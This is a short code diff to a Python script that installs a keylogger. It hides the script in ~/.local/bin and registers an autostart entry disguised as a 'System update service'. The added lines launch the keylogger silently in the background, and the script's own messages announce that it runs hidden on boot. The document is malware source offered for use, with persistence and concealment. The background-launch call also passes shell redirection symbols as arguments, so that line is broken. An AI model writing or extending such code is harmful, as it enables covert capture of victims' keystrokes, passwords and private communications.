@@ -1,5 +1,6 @@
 import os
 import shutil
+import subprocess
 
 HOME = os.path.expanduser('~')
 hidden_dir = os.path.join(HOME, '.local', 'bin')
@@ -28,4 +29,10 @@ Comment=System update service
 with open(desktop_file, 'w') as f:
     f.write(desktop_entry)
 
-print("Keylogger installed to run on boot (hidden).") 
+# Start the keylogger in the background using nohup
+subprocess.Popen([
+    'nohup', 'python3', hidden_script,
+    '>', '/dev/null', '2>&1', '&'
+], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+print("Keylogger installed to run on boot (hidden) and started in the background.") 
